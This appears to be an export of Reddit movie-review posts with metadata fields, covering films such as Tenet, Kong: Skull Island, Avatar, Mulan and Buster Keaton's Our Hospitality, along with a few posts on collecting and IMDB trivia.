
They take yellow pills (I know) which enables them to ‘glitch’ the system. Basically it gives them temporary telekinesis. Fast forward a bit of boring narrative and they take blue pills (just dont) which enables them to leave the simulation.

They both then wake up in a laboratory, where it is revealed that the man (Wilson) had volunteered along with approximately 10 other ‘volunteers’ to be neurologically linked together by virtue of some experimental computer, which resembles an aquarium with floating brains inside. Turns out, the downtrodden man is actually a doctor and the hobo women is in fact his doctor wife who created the brain-aquarium computer and the simulation they were in. 

However, Wilsons character has no memory of being her husband, nor of the ‘real’ world that they actually live in together, that is almost heavily. Furthermore, it turns out that his daughter from the simulation whom is worried about her father, is actually just part of the simulation. Fast forward more boring narrative and it turns out that as the characters did not take enough of the blue ‘exiting’ pills, they start hallucinating elements of the simulation in the supposed ‘real’ world. Hallucinations that include Owen’s character seeing his daughter. Therefore they hook themselves back up to the brain aquarium computer and re-enter the simulation. Waking up in the simulation exactly where they were when they left, having shared the same experience of the ‘real’ world. 

Now, this is where the film attempts (and in my opinion fails) to make the audience question which world is true and which one is ‘make believe).

The undertone of the film tries to make the audience question whether these telekinetic powers are actually just the result of Owen and Hayek’s characters tripping on the pills. 

However, if the ‘real’ world was just a mad trip, then how was it a shared experience? Furthermore, upon reentering the simulation, Owen’s characters dead boss has been ‘rebooted’ by the system and is in fact very much alive. 

The problem is, the film also throws in some attempts to allude that the ‘real’ world is a trip by including the appearance of his daughter from the simulation into the ‘real’ world. Now, i can get behind this being explained as a hallucination due to them exiting the simulation wrong, however, the film-makers make a cardinal sin, by showing Owens characters daughter in the ‘real’ world away from Owen’s character. Furthermore, she is warned not to approach him by someone. This is one of the worst attempts of a red-herring I have witnessed in a long time as it breaks a barrier/dimension that it shouldn’t. Hallucinations should only appear in the presence of the hallucinators. 

I love films that challenge the audiences perceptions and make us think, but there must always be certainty and a logical conclusion. The puzzle pieces have to actually fit. 

This films submits unexplained contradicting evidence which tries to demonstrate that either world could possibly be the real world, alongside submissions that demonstrate that neither world can’t possibly be the real world. 

This makes for an uncomfortable end, as this puzzle can not be pieced together. It demonstrates laziness on the film makers behalf and is therefore one of he worst films i have ever seen",moviereviews,3790,622,56,0

The film floats in zero gravity with almost no desire to bring intensity, build up, or an adequate level of mystery to the audience, and with the absence of synergy between the two contrasting plot locations, even the committed performance by Clooney and co and the pleasant CGI could not pull the film away from the black hole that it is heading to.

It's kind of weird to review this movie now, considering the director of the movie already pointed out everything wrong with it... so I guess review done? Nope? Okay...

""Kong: Skull Island"" is a blast. The insane amount of sheer mind exploding awesomeness is a ton of fun. It is the movie that r/moviescirclejerk will hate, but the movie will be laughing all the way to the bank. 

While I know everyone doesn't have strong (or any) character arcs, the acting is still really freaking good! The two highlights for me personally were Samuel L. Jackson, & John C. Reilly. Jackson plays the villain of this movie spectacularly well, selling every moment of a man who can never leave war behind and has to bring it wherever he goes. Reilly really sells a man who has been trapped on an island for years, and has learned how to survive. This man holds an imaginary hotdog and beer in one scene and just the sad look in his eyes made me want to see him get off the island... this is a freaking monster movie, why am I caring about these characters making it out alive?!?!?  


That's honestly something I really enjoyed though; when a character died, most times I felt sad they were dead. They all had one thing they wanted to do when they got home, and to see they won't make it home was sad. And some of the deaths in this movie are extremely unpleasant, and i'm saying that as a positive of the movie. I still think about that bamboo spider's appearance... yikes.   


The best things about this movie are the visual effects which bring each creature and setting to life in massive ways, added to the fact the cinematography is gorgeous!  Not just in the way everything is shot, but the fact of how they choose to use cameras. When using CG floaty cameras, I feel like it was needed, however most times the camera shoots the monsters like the monsters were there on set doing all these stunts. It makes everything feel more believable, and feel more for what's going on.   


Again, any negatives I have with the movie have already been satirized by Jordan Vogt-Roberts, so not more to say, than check it out and have a wonderful time. 

Rating: 8.5/10

1611445239.0,Is Upgrading Your Movie Collection from DVD's to Blu-Rays (or 4K's) Worth It?,"To the movie collector's out there!   
I've been thinking about this question quite a bit over the past couple months; In whether buying the same product (title) again on a better platform (Bluray or 4k over DVD) is worth it or not? Ive finally come to the conclusion though that at least for me that answer is yes.   
So I've started to upgrade my collection this way after a long time of saying I'd never do it because I didn't want to buy the same movie twice. But eventually I got here lol..   
When it comes to blurays I've come to appreciate the quality more (less so 4K's because I honestly can't see they much difference between them and a standard bluray at least on my TV..?) and I like having the movies I \*really love\* on the superior format plus it's been fun kind of ""re-collecting"" some of my ""must needs."" And the aim is to get to that ""quality over quantity"" status (but I kind of constantly fuck they up because I can't say no to a good deal haha) So what about you? Do you/have you upgraded portions of your collection? Do you think it's a massive waste of money or just a harmless fun endeavour for a collector to go on? ...any regrets?

Anyway I did a video talking about this topic for those interested, linked below...

\*\*And by the way I'm doing this upgrade thing as cheaply as I possibly can so Im not going nuts-o on giving away my life savings or someshit for this so don't worry!! Honestly the average I pay for a Bluray is $5-$7, the most I'd pay for a standard Bluray would be like $15 with exceptions for special editions and stuff  - - -  - [

1611004045.0,Criterion Collection upcoming titles for April 2021 - CINEMIN review,"Again Criterion Collection presents for fans like us, a series of new titles that will leave everyone very satisfied. There are five films, two reissued for the first time in blu ray and three titles are new to the collection. I watched them all - and that's why it took me a little longer to publish this review.

The first film HISTORY IS MADE AT NIGHT (1937) directed by: Frank Borzage - there is a revival of the work and technique of this director and his romantic films by all American critics. I liked this film because among other factors the tone of comedy that is light but effective in this case and the charisma of Charles Boyer and the wonderful (as always) Jean Arthur. I watched the copy available on YouTube but it sucks so in 4K it looks like the movie becomes even more fascinating. Then we will have THE FURIES - directed by Anthony Mann (specialist in very good westerns). The film implies a rancher (the excellent Walter Huston in his last performance) whose heir is his only daughter (Barbara Stanwyck) and what appear at the beginning as happiness gradually become conflicts when the father tries to be predominant in the choices of his daughter who eventually rebels. Without the conventions of a classic western film, this film imposes itself with its history of struggle and glory for principles and not for the use of the weapon. I loved it.

Changing direction to a small town in South Korea, director Bong Joon Ho (Oscar winner for best director for PARASITE) in his second film, leads us to a true story about a murderer who infiltrates the thicket and violently kills his children. Victims - all women - with cruelty in a story that shook the country for several years. The film focuses on unconventional investigations in which the local police do not even have the equipment necessary for an investigation of this size. The detectives dilemma and one of the highlights of this film starring: Song Kang Ho (efficient as always) as one of the detectives. Every compliment for this film seems modest compared to the grandeur of what the director manages to convey by watching the story unfolding in front of us and the very complexity of the facts. One of the best releases of the year. 

\\We then left for France with two important films: IRMA VEP directed by Olivier Assayas in 1996 that left the head of the critics of the time spinning - some loving others not so much - but that was very important for the director since then because he established it with a new gallows for the new French cinema. The story unfolds as in a film within a technical film that does not necessarily need new ones but imposes itself free of opinions of how a foreign actress the beautiful Maggie Cheung (later she would marry the director) hired to star in a French film that is a remake of a classic silent film from 1916 LES VAMPIRES and its difficulties with the language and in part with the intrigues that happen behind the cameras. The movie pleased me a lot and I even watched it on YouTube with a fantastic image. Worth it. Finally the last film is a classic French New Wave directed by no one less than its last survivor the great and very difficult and controversial director Jean-Luc Godard and his film MASCULIN FEMININ that now arrived for the first time in blu ray. This is the type of film that allows several readings due to its complexity and simplicity. Starring the great idol New Wave the actor Jean-Pierre Leaud (fascinating) and the pop star of the time Chantal Goya who embark on an adventure relationship at the same time but with very advanced connotations for their time. Godard was severely criticized when this film premiered and today the same critics of the time who believed that the film simply portrays banalities did not understand the greater message of alienation combined with a youthful rebellion that would be somewhat striking in Europe in the 1960s and perhaps even in the world the level of behavior change. I loved all these films for different reasons. Criterion is to be congratulated ... again. DN

 But I have picked things right up pretty quickly since things have eased a bit where I am.

1607012130.0,Jurassic Park (1993),"""Genetic power is the most awesome force the planet's ever seen, but you wield it like a kid that's found his dad's gun.""

Sam Neil, Laura Dern, Jeff Goldblum, and Sir Richard Attenborough killed it! Terrific movie with a fair amount of plot holes, but it's so good that you don't even care. 

The lunch scene with Hammond, Malcolm, Sattler, Grant, and the blood-sucking lawyer debating the ethics of bringing dinosaurs back to life is an incredible moment in the movie that sticks out a lot to me. I could seriously watch them go at it for 45 min in that dark room. I think my favorite point that Malcolm brings up is the difference between natural selection and genetic drift. 

Also, shoutout to Michael Crichton for really wanting to kill Tim. Tim almost dies in this movie approximately seven times. 

There shouldn't have been sequels to this. It makes absolutely no sense for anyone to know what happened in this movie and say ""Let's run it back!"". 

If you were to do a sequel, I can only think of plots that at best deserve a SyFy channel movie. Jurassic Park: Prison Island. The year is 2040 and instead of maximum security prisons, we are just sending criminals to this island with man-eating dinos and saying “good luck”. I know 2040 is only 20 years from now, but if that were to happen I wouldn't bat an eye.

1606614252.0,[OC] The Dumbest of IMDB Trivia - (Hilariously Weak/Redundant or Innacurate Entries in the Trivia Section)," Hey does anybody else 'round here find this very specific type of amuesment in badly done - publically edited sections of websites? Wikipedia's been known for years to be guilty of this but I found my personal favourite version of this year's ago which of course revolves around movies:  
Ive been a fan of the IMDB trivia section for a long time, and legitimately too: There is a lot of good stuff there and interesting stuff to learn..   
But there's also these random entries in there that just come off as super funny to me. Obviously anybody can add to sections like these and so some of the submissions are clearly a lot weaker than others, so this results in some of the ""facts"" being just straight up factually wrong, some being just VERY OBVIOUS and redundant and some being just funny for other very specific reasons depending on the entry. 

A favourite of mine that I've found recently was for The Hunt (2019) which reads: ""This isn't the first film where Ethan Suplee had had to run to try to catch a train. The first time he had to run for a train was in the movie Unstoppable."" It's just so painfully uninteresting and so obviously just a vague coincidence that I find it so funny that somebody bothered to put this in there. Like why lol? 

Anyway do you have any examples of funny submissions or even on-purpose jokes labelled as IMDB trivia and/or do you find this stupid shit as funny as I do? 

Or conversely: What is your funniest movie fact?

1605542591.0,Movie review: Mookuthi Amman," 

I’ve been thinking of writing movie reviews for quite some time, but I never thought *Mookuthi Amman* would be my first.

*Mookuthi Amman* (Nose-ring Goddess), is a fantasy-comedy, Tamil movie with a spiritual touch.

Oorvasi, R.J Balaji and Nayanthara have played their roles in a  dutiful manner. There’s been quite a lot of hype about this movie as  soon as its trailer was released. Since then, people have been very  skeptical about the scene in which Nayanthara states “Naan thaan Amman”  which means “I am the Amman”. I never expected such an introduction for a  Goddess. That was rather dull-witted and shows laziness in the dialogue  writing.

In some of the scenes, Balaji has brought out his dialogues in his  usual way which turned out to be funny. This is possibly the only  redeeming aspect in the movie.

Initially, there is a scene were he meets a girl for a marriage  proposal and behaves as a very shy person. But when he meets the girl in  person, he tells her he will continue to be a responsible brother and a  son. A person who has always been responsible doesn’t have to be shy  and timid in front of a crowd.

The movie mainly shows about the different types of temples in the  city and the fake saints who pretend to do wonders for the people.

There is a 11,000 hectare property which is going to be occupied by a  fake saint, which has got several temples, plantations, etc. Balaji  works as a reporter and takes this as a project for 6 years and nothing  happens. He then prays to God, asking at least one God to help him in  this matter. 

Then Nayanthara appears and helps the people of the village  understand that there are fake saints almost everywhere and asks people  to directly invoke God rather than going to these saints. During the  course of the film, there are few scenes hurting  Hindu sentiments. This  could have been avoided as 70% population in the southern India are  Hindus.

I heard there was a scene which had a christian priest healing his  devotees. But that scene was deleted by the censor board. I wonder, why  they didn’t apply the same logic to Hindu sentiments which were being  mocked incessantly and carelessly!

Background score for the Amman was typical and just like other  goddess’ movies. The song where Balaji calls out Amman could have been  better. Oorvasi has done justice to the movie, so has Nayathara. Orvasi  had a good role in the movie as a single mother who raises her 3  daughters and Balaji.

Overall, a good attempt but could have been better if the movie  didn’t have to hurt the religious sentiments of Hindus alone. I hope the  censor board doesn’t take this lightly in the future and treat all  religions equally.

I would rate the movie a 3.5 out of 10.

Note: This is my personal review of the movie.

1605512306.0,I watched Avatar for the first time in ten years and....,"On Friday, I watched Avatar for the first time in ten years. I saw this movie when it first came out in theaters back in 2009 and back then I thought it was a cool looking movie but other than the visuals the movie was boring. 

After watching it again years later, unfortunately that opinion still remains the same. The visuals still hold up years later and still look phenomenon al and is a well acted film. Other than that, I still feel the movie is boring, has a generic story that's been done so many times that it became predictable, and the characters are one dimensional and bland. 

I get this was a passion project (it had been in development since 1994) for James and his heart was in the right place but Avatar is just style over substance. 

Also, the fact that there's gonna be four more sequels is ridiculous. Do we really need five Avatar movies? Honestly we don't.

I'm probably just rambling now but Avatar is one of those movies I don't like that alot of people do. I can remember the amazing visuals but thats it. There's nothing else to it and I watched the movie a couple more times after I got it on bluray and it still doesn't work for me.

1601790731.0,Enola Holmes Makes You Desparate for a Sequel!,"After a horrendous Holmes and Watson (2018), fans would be pleased to know that Netflix' latest production is a respectable addition to the Sherlock franchise. This is probably the only film in the franchise which isn't about Sherlock, but about his equally witty and skilled sister - Elona Holmes. 

(No spoilers follow below)


Netflix' Enola Holmes hits all the right spots when it comes to storytelling and character interpretations and succeeds in paying a praiseworthy homage to the works of Sir Arthur Conan Dyle. Never once does the movie feel boring or uninvolving, thanks to a cleverly written script and amazing performances throughout. The film does not feature iconic Sherlock characters like Dr. Watson or Professor Moriarty but frankly I was so sold by Enola Holmes, that this film could have done good even without Sherlock himself.

Enola Holmes, brought up single handedly by her mother, is an extremely smart, skilled and unruly girl who wants to step out of the shadows of her successful brothers and make her own mark. Millie Bobby Brown delivers a tremendous performance as Enola, overshadowing everything else in the film. It almost seems like the Emmy winning actress was born to play Enola Holmes and just instantly settles in your mind as a female Sherlock. Her effortlessly amazing character portrayal leaves the audience yearning for more and this film just seems like a beginning. Ughhhh, Netflix, why didn't you make it a series?!

1600692072.0,"I'm Thinking of Ending Things (2020) review: Everything we see here, all of it... bone!"," 

>*""Life is not a series of gig lamps symmetrically arranged, life is a luminous halo, a semi-transparent envelope surrounding us from the beginning of consciousness to the end.”*  
*-Virginia Woolf*

I’m thinking of the scene when the young girl was introduced to Jake’s parents. His father ignored Jake almost the whole evening. I am thinking of another scene where the car stops at the farmhouse. Jake took the young girl direct to the barn. Here, he recounts a story that his father, caretaker of their livestock, forgot to take care of his pigs for days. Eventually, he found that one pig was being eaten alive by maggots. There were two pigs, another one was being eaten alive by his lonely life, unreceived love, unfulfilled hopes. A new movie by the brilliant writer-director Charlie Kaufman [**‘I’m Thinking of Ending Things**]( is a surreal, multi-layered jumble of what is and who is real or imaginary. “**Be careful out there, the roads are treacherous**,” a dialogue of the film applies to you too if you decide to watch it. 



I’m thinking how ingeniously Kaufman has presented his concepts about time, love, hope, life, age, loneliness, vulnerability, uncertainty in an artistic way. On the surface, a woman with her boyfriend goes on a car trip to meet his parents on a farmhouse passing through a snowstorm. But actually, it’s we who are passing through the frigid projection of his fragmented memories, figments of imagination, feelings of loneliness, lost, which leaves us chopped and frozen. It seems there are two different people with a different set of minds, one is a painter, poet, physicist, cinema critic, and another one was just awarded “**You there, you work very hard, you’re not very bright, but we are impressed you tried anyway**” but we see two different selves of Jake, one is who he is right now, the disappointed one, another is who he always wanted to be. Interestingly we are seeing an old man working as a janitor at some school. It’s clear that he is an old self of Jake, but the road trip is his imagination, or dream, or some past incident that gets clear eventually.

I’m thinking of how highly symbolical the movie is:  

1) It simply begins with ‘**ending things**.’ The young girl to whom Jake met many years ago at a trivia night but couldn’t approach her, since then he is imaging about her always. She also personified the desired self of Jake. So, today Jake might be thinking to end these imaginations of her. He might be thinking of end everything from his life he ever desired. He might be thinking of ending his life.

3) ‘Lucy,’ a woman who inspired Wordsworth to write five beautiful poems. Whoever is familiar with these works already know what the young woman meant by ‘**LIKE ME**!’ as ‘Lucy’ was never a real person, she was a fictitious character or a literary device used by the poet to express his certain thoughts and feelings. 

4) Interesting symbol is of the poem ‘Bonedog.’ Not just its represents Jake and his life, but when the girl says directly into our eyes that “**everything you see now, is just …bone,**” that means we do not see everything, something is always out of the frame and it perfectly has shown through the 4:3 aspect ratio of the camera.

I’m thinking of many other things. Cold and icy weather symbolizes the inner emotions of Jake. Jake believes himself as the pig – less adored, abandoned, ill animal, frame from childhood simply suggests Jake and the girl are the same person, he keeps forgetting small details - jumbles ages of parents – hallucinates the pig at the end means not his father, but he might be the patient of dementia or Alzheimer, and I have no idea how many others I am missing.

I’m thinking of the end. “**How long does it take to get hypothermia**?” At the dance scene, Jake and the young girl are replaced by the dancers, happy, together, about to do marriage, but suddenly a look-alike of the janitor comes and kills Jake. It may symbolize how years ago, an incapable, hesitated, the doubtful self of Jake killed a promising self of him. (the scene where the real Jake clears the mess around the imaginary Jake gives me goosebumps!) But the end is positive! His final imagination gives pain and happiness together. He finally appreciates himself. He receives a Nobel prize for whatever work and struggle he has done. For the first time, the blue color is bright, and the blizzard inside and outside has stopped for good.

**I’m thinking of T.S. Eliot**, one of my favourite modernist poets. His incredible poem ‘The Waste Land’ kept coming in my mind. Why? The movie and the verse have myriad allusions of great works. The poet and the director not just showing their prodigious knowledge of varied art but also presenting them in their work as they are suggesting a great art lifts another art to the sublimity. **I’m also thinking of Virginia Woolf,** the great ‘stream of consciousness’ novel writer, she says when a writer decides not to follow norms, he creates something innovative and original. That’s why I love surreal art, literature, or cinema, its unconventional. And after Lynch, Svankmajer, and Aronofsky, I will happily add Kaufman into a list of my favourite directors who have given a transcendent level to the surreal cinema.

I’m still thinking endlessly about the film and I think I will not end thinking about it.",moviereviews,5353,924,127,0
1600378854.0,Striptease * *," Watching this  reminded me when I was a kid. I was 11 years old when this came out, thinking it was this forbidden semi-pornographic movie that no kid at my age should never ever watch starting super hot actresses Demi Moore. Which I Believe still looks great today, and it only took me 24 years to sit down and watch it. 


Demi Moore  plays a out of work FBI Secretary in a child custody battle with her ex husband (Robert Patrick) who takes a job as a stripper to be able to afford her court fees. A congressman (Burt Reynolds) one day walks into the club and  takes notice of her and becomes immediately infatuated with her. Using this now to her advantage.

Will  I  see down and watch this again? No. For a movie called “Striptease” there was way far less nudity then i expected. The is more of a “ comedy gangster film “ with a Sexy Demi Moore as the main selling point. Not saying it was a bad movie.  Just not a very good one , with potential to be a hilarious crime comedy. The movie also wore out its welcome right after the 90 min mark. Ving Rhames her bodyguard and Robert Patrick  were the highlight of the movie.

-------------------------------------------------

It’s an efficient retelling of a tale about a young Chinese woman discovering her power—affecting at times, occasionally quite lovely, but earnest, often clumsy and notably short on joy.

Uninspiring character development - one of the things that I liked best watching Disney's 1998 animated film-Mulan was the fact that it highlighted the internal conflict common faced by many asians that are forced to conform within high-context cultures that would otherwise be dismissive of your own identity or brand. The Mulan that was put forth in 1998, wasn't the strongest but she worked with what she had and got help from her friends (an average jane that got by). Fast forward to 22 years later and we have wonder-woman Hua Mulan who's drank all the kool-aid giving her ""unmatched chi"" (see high midichlorian count - Star War) and the innate ability to bicycle kick an arrow shot-caught-and then thrown into the air by a bound emperor to kill a man who should have died when he fell from what seemed like 50 feet to the ground (let's not forget that this guy then gets up and shoots an arrow to a bound emperor only to have that arrow caught, thrown in the air and then bicycle kicked back into his chest - have I mentioned the bicycle kick?)

1598480731.0,Tenet (2020),"Ok, so this movie will confuse a lot of people.

When you're about to watch an action movie written and directed by Nolan, you know that what you're getting will be anything but straightforward. Only, here Nolan outdid himself in designing a complex concept that will make you wish you'd be watching something as 'simple' as Inception. 

Yes, it is complex, and perhaps so complex that as a viewer you will have a hard time determining the importance of the stakes that are at play. The complexity was in my opinion detrimental to the tension of the movie. At least on a first viewing. If Nolan will miss out on some initial revenues due to Covid, he might just win them back because all those who'll 
watch it will be in need of a second viewing to fully understand the movie. I'm of course exaggerating, but still, it will leave some viewers unsatisfied after an initial viewing.

Complexity aside, the major problem of the movie is unfortunately the screenplay. More precisely, the way the characters are developed. Our protagonist has very little depth. Washington does a great job but is seriously limited by the material he's given. His character is without a question the main driver of the movie, only, that's all he is. His needs, inner desires, are almost non-existant. You could argue that this is something Nolan had to give up to support the complex story, but DiCaprio's character in Inception proved you can have both: compelling characters and a complex, intriguing plot. The only chata ter with some of a compelling arch is Kat, played by Elizabeth Debicki.

That being said, the story really pays of well at times and the more it progresses, the more the concept will start to make sense. Which in turn improves the tension. But still, this is definitely not a movie that is intended for one viewing. A movie never should be, in my opinion, but you should get more out of a first viewing than what Tenet gives you.

Even though you will be confused at times in your first viewing, the action is will directed, the movie is well shot, it's well acted (although there was some bad dialogue but that's again on the screenplay), and I enjoyed the sound mixing and score. It is definitely a good action movie, but unfortunately it stops there and I'm not sure whether a second viewing will change that. 

With a Nolan movie, you can't help but compare to his other work. And at this point, Tenet seems to be his weakest entry as it simply lacks the focus on character and compelling story, losing itself to its complex concept. 

Still, overall a good movie and I'd encourage everyone to go check it out in theaters if safe enough within your country/area.",moviereviews,2669,470,72,0
1597355718.0,Buddah's Hot Take of The Day (Twilight Series Review) 3/10,"Growing up I often found myself stuck on the couch watching these Stephanie Meyers adaptations, because my sibling is a huge fan. I never saw the appeal. I could never force myself to watch these movies, but I decided to trek through them to see if they had any redeeming qualities. To my surprise, I did find some. The acting in some scenes is god awful and the very edgy-attitude filled characters make me spit-take as I watch the movie. There is no weight to the story. You know that Bella, is gonna end up with Edward, you don't have to watch all four to get that either. Yes they tease the thing with Jacob, but it has no weight, therefore we can't really build an emotional connection to the relationships in the movies. At no point are we ever just sitting, and shaking in our boots to the point where we can't tell what's going to happen. It's a predictable story with a predictable ending. The only saving point for me, in the whole series, is that crazy seen with Alice in the last movie. It was cool seeing everyone kill each other.

1596951993.0,Review: Percy (1989)," **Movie**: Percy / **Director**: Pervez Mehrwanji / **Language** (Gujarati, India) / **Genre**: Drama

I finally watched a flick that I am proud to say it’s in my mother-tongue, Gujarati! '[**Percy**]( is about a young, innocent, shy Parsi boy in his late 20s who reflects us in so many ways. Based on the short-story of Gujarati writer [Cyrus Mistry]( The movie delicately portraits a sensitive, misfit Percy. He could not express his innermost feelings and gradually lapses into his elusive world of music and dance. The movie has received the ‘Best Gujarati Film Award’ of 1989 at the 37th [National Film Award]( I am recommending to all who love to watch gentle and thoughtful movies. 



Percy ([Kurush Deboo]( lives with his religious, hard-working, sweet, and caring mother Banubai (Ruby Patel) in a resident of the middle-class Parsi community. He works at a drugstore not much liked by his fellow colleagues, gets constant taunt from his neighbours, his heart breaks when his childhood friend Vera gives news of her wedding, gets criticized for being a delicate and not like a ‘man,’ he could not express himself, and so on. Ain’t he us? He finds his happy place in music and creates an imaginary world around him. I find it in cinema and escape from reality around me. We all do. We all run in our happy places. Everything was going good (?) until an event took place and shattered all the illusions of him. 

This movie is not for all to see, but this movie is for all to experience. You will find yourself with Percy at home enjoying a favourite piece of music and dancing alone, in following the love of your life at the same time losing it in moments, in the day on the busy streets, loitering which feels like lost, at nights on sleepy roads, drifting aimlessly reaching to nowhere. Since it is not a box-office targeted flick, we could put it in an art film. 

Blissfully this movie has avoided all the stereotypical cringe of an average Gujarati movie (I have grown up seen tons of them). So, until I watch a good film of its match (Bhavani Bhavai, Dhad, Reva, Hun Hunshi Hunshilal, The Good Road, and Santu Rangili (adaption of the novel Pygmalion) are yet to watch), this will be my most favourite Gujarati of all time. You can buy it from [here]( or you can watch it at [the Mubi Platform]( (15 more days to watch there).

Was sad as I left the cinema”

Lion: “it’s just what I needed to fill two hours lock down time”

Silver Linings playbook: “for a long time I was very distressed but it all came together in the very end. The old adage, love conquers all”

Stand by Me: “I absolutely loved the film.  I think I will see it again.do so again.  They were so keyed towards each other and displayed such a depth of understanding towards each other which belies the belief that teenagers lack these feelings - my grand children not included.

1595777292.0,Survive the Night (2020): Review,"The cast:

Chad Michael Murray plays Rich, a disgraced doctor who is forced to move in with his parents after being sued. He plays the role somewhere between a beloved country doctor and a disgraced military vet. His performance is fantastic, despite the not-so-great writing. He manages to elevate the movie and might even have saved it if not for the glaring plot holes.

Bruce Willis plays Frank, Rich's father. I honestly expected him to be playing Bruce Willis, but he brings an incredibly intuitive and beautiful level of sensitivity and reliance to the plot. He plays everyone's aging dad masterfully. You really feel drawn to the character.

Opposite Bruce Willis, Jessica Abrams plays Frank's wife. She perfectly embodies the warm, cookie baking country grandmother you immediately love and trust. Her smile is intoxicating, and her warmth effuses from the screen in a way that can't be faked. 

Lydia Hull very likely should have spent more time trying to connect with the character of Jan, Rich's wife. Her performance is lackluster and expressionless. Imagine Stiffler's mom in a drama: same hair, same implants, same voice. It's difficult to fathom what Rich sees in her, in unless she's just another testament to his general depression. 

Riley Wolfe Rach plays Rich's daughter brilliantly, showing remarkable talent for someone her age. You can believe that she is terrified. 

The two criminals are played by Shea Buckner and Tyler J Olsen. The movie is worth watching if only for the dynamic these two had on screen. They play two entwined Brothers so well that you forget they're just actors, and honestly leave you with more ""sympathy for the devil"" than for the main characters. 

The crew:
The movie is visually stunning and the shots are engaging. There are only four sets: three of them shot on the property of a large farmhouse with several outbuildings. 

The special effects are spot on and realistic. There are no sudden neck geysers or unrealistic exploding cars. There's just the right level of cringe. 

The plot:

Trying not to fall through the plot holes of this movie is like trying to play minesweeper without stepping on a mine. It would take some serious mental gymnastics and wouldn't really be worth it. 

If one of the criminals is so against killing, who did he kill at the beginning and why? It seems like the criminals just sort of switched roles in the convenience store at the beginning, and it's weird. 

We never find out why or how Rich lost his job. He and his family are constantly arguing about his job loss and subsequent homelessness, but nobody has any clue what happened or why. Someone who ld have spent the $150 to consult with an actual doctor and find out how and why they are fired/discharged if they were going to make it the entire basis of half this movie. 

Out of 5:
This movie was a 2 for me, a 1.5-1.8 on most review sites. It has 1.9 super rotten tomatoes. 

The Best: 
The camera work, some of the acting, and the pitch. 

What this movie needed:
Stronger female characters, less plot holes, more plot in general. 

Who to blame:
The writers had the biggest role in this one, but a lot of the poor writing could have been fixed on the cutting room floor. The casting director might have chosen the wrong female lead, or the character might have been poorly written. I'd love to see the original version of the script, to see what was cut. 

The prognosis:
The festering wound that is the predictable, craggy, and boring nature of the plot is covered in multiple layers of big name actor bandages, but still pokes through. 

If I knew then what I know now:
I wouldn't watch it again. I wouldnt have watxged it before.",moviereviews,3684,639,100,0

I don’t have a racist bone in my body.... at all. Let me make that crystal clear.

Funny they approved all my pro-black movies that I had reviewed positively. 

Soo... out of the 8 movies that were filtered out by IMDB as “bad formatting”, I reviewed again. This time giving 2 out the 8 good reviews. Those two were published immediately. The other 6 I still gave negative reviews. All 6 of those rejected again. 

I made sure to use proper grammar. No political bias in the review. In fact I made the reviews just one paragraph (about the average size of all their reviews) and made for certain that I used better than average grammar. Still all 6 denied for bad formatting. 

I’ve come to the conclusion that IMDB is now trying to skew reviews. Not just trolls anymore. They are blatantly doing it themselves. What is going on with this world. Truly disturbing.",moviereviews,1238,222,33,0

1593212254.0,Our Hospitality (1923),"*In which we meet two families, both alike in their lack of dignity.*

The second of Buster Keaton’s self-directed feature films, *Our Hospitality* is both a precursor to some of his later triumphs and a simply executed movie that succeeds on its own terms. 

Like many Keaton films, I caught this one for free in a well-restored version on YouTube. Late one Spring Saturday night, I found myself in the mood for a breezy hour and a half in the company of a gentle entertainer to while away the evening. Since beginning to watch these movies for the first time, I never fear disappointment when either Chaplin or Keaton are on offer. I was again more than satisfied. 

Set in the 1830s, *Our Hospitality* is a satire of the famous Hatfield/McCoy feud of the late 1800s. It follows the adventure of young Willie McKay as he returns from New York to the small town where his father once fought with the Canfield family.

On his train journey, he meets and befriends a young woman who is unbeknown to him the daughter of the Canfields. On arrival, he’s soon attacked by her father and brothers but finds himself inside the Canfield house, where their code of honour prevents them from killing him.

The film blends romance, slapstick, action and a comedy of manners within a beautifully costumed and realised period drama. Unlike later Keaton films, the stunts weave their way through the film like scenes in a tapestry, threaded seamlessly within the story. Each set piece flows from the action of the characters as they try to outsmart each other.

Two scenes, in particular, stand out. The first, in what feels like a dry run for his more famous work in *The General*, takes place on the train from New York. Keaton, and others, seem to spill off, under and through the train in fluid movements as it winds its way around obstacles and over rocks. Later, on a specially built stage, Keaton swings out into a waterfall to catch his girl – again moving with the grace of a ballet dancer despite the gallons of water rushing down towards him.

A few visual gags are all-time greats too – the engineers picking up the train track and moving it around a stubborn donkey, the hind legs of Keaton’s horse dressed up in his disguise and the many pistols he has strapped to his body when returning to the Canfield house.

One more well worth mentioning is achieved through editing, as young Willie imagines the estate he is travelling to claim as a grand home, at odds with the ramshackle house he finds. [As Michael Barret notes]( “this imaginary image becomes a great sight gag” used twice in the movie – initially as a wink to the audience, then to show McKay’s realisation as it explodes.

Though there’s perhaps too much screen time spent on the initial train ride – Keaton was a big fan of trains and had a replica of Stephenson’s Rocket built for the movie – from the moment it arrives in the small town the film is beat perfect. Superbly measured, it manages to pull off the feat of blending a range of genres whilst entertaining at full steam from beginning to end.",moviereviews,3065,546,49,0
1592017187.0,Dairy Of A Wimpy Kid: The Long Haul (Review),"Bruh. Like who has the mentality to come up with this movie?

This movie shouldn't even exist. This is why I call the Diary of A Wimpy kid series a ""trilogy"".  What saddens me the most is that the director, David Bowers, directed the two of the best movies, failed to make this movie as good as the others. I understand that all the actors moved on with this series due to growing up, but this is not about the actors. I see potential in the actors, but it's the director's fault since he didn't give the actors another take to redo their bad parts. 

I saw it in fifth grade, and it was the last day of school. I saw it in the theater with my old friend. I thought it was pretty good. I was dying of laughter when the poop jokes came on, but c'mon, I was in fifth grade!  

I later look back on it and dislike it. My friend said this to me while we were playing video games. He said that ""Diary of a Wimpy Kid isn't a movie. It's a lifestyle"". This movie, in particular, isn't a lifestyle. One reason is the acting. It's so bland, but that's the director's fault. In the book, Jeff Kinney does a great job of describing things well. This book just piles a bunch of situations together. The tone of the family also changes. In the first three movies, the family is much more loving, and the family gets along well. This movie depicts them as the complete opposite as they're always getting into arguments and always messing things up. I don't like to see that all the time in a movie. 

There is so much more I want to cover, like how Rodrick is dumb and they make Manny a genius, but in the end, this shouldn't even count as a Diary of A Wimpy Kid movie, or a movie in general. Thanks for reading and have a good day.",moviereviews,1718,334,62,0
